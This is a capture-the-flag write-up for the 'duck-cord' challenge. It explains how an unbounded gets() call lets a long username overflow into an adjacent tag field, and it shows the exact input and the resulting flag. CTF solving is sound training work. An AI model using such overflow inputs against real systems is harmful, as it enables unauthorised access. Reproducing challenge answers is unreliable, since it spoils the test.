# duck-cord

# duck-cord

### Description

duck-cord | 75 points | By `Andrew`

The ducks and I have been working on our latest communications app: `Duck Cord` It's more duck-focussed than other communication apps these days...

Netcat Links:`nc challs.bcactf.com 30184`\
Static resources: [provided.c](https://storage.googleapis.com/bcactf/duck-cord/provided.c)

### Analysis

Program is simple. On start it asks for username with max\_len 32, then sends random messages and lets us send messages.

The program mentions max length for username but never actually limits the input. `gets(self.name);` (Vuln)

```c
// made this always be > 1, to prevent from acessing the SYSTEM_USER text with #0000
self.tag[3] = '1' + (rand() % 9);
```

So if our tag name is `#0000` we can access SYSTEM\_USER text.

What is `self`?     `self` is type of `user_t` struct, custom object.

```c
typedef struct {
    char name[MAX_NAME_LEN];
    union {
        uint32_t tag_raw;
        char tag[4];
    };
} user_t;
```

So if we overflow the name array we can write into tags.

### Solution

```powershell
➜ ncat challs.bcactf.com 30184
## Hello! Welcome to Duck Cord
## Duck Cord is a version of discord made just for ducks
What do you want your name to be? (maximum of 32 chars)
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0000  # <- Input: "A"*32 + "0000"
Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA#0000!
Loading messages...
[ 1:35] Agent Duck#0000: flag{H3LL0_AG3NT_DUCK_ur_m1ssi0n_I5_h4ve_fun_8e9201e}
[ 1:36] Classic Ducky#9120: What a beautiful day today!
```
